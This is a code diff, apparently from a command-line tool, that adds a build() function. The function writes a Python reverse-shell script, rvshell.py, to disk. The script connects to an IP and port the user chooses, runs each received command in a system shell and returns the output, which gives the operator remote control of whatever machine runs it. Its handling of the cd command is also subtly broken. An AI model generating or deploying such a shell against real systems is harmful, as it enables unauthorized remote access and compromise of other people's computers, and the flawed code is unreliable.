@@ -84,3 +84,28 @@ def port():
 def ip():
     global IP
     IP = input(f"[{RED}IP{RESET}] {RED}>{RESET} ")
+
+def build():
+    output = f"""\
+import socket, subprocess, os
+
+HOST = "{IP}"
+PORT = {PORT}
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+while True:
+    s.send(f"{{os.getcwd()}}>".encode())
+    cmd = s.recv(1024).decode()
+    if cmd.startswith("cd "):
+        os.chdir(cmd.strip("cd ")).strip()
+        continue
+    output = subprocess.run(cmd,shell=True,
+                            capture_output=True)
+    s.send(output.stdout + output.stderr)
+
+"""
+    os.makedirs("output", exist_ok=True)
+    with open("output/rvshell.py", "w") as f:
+        f.write(output)
+        print(f"[{GREEN}+{RESET}] Succesfully generated rvshell")
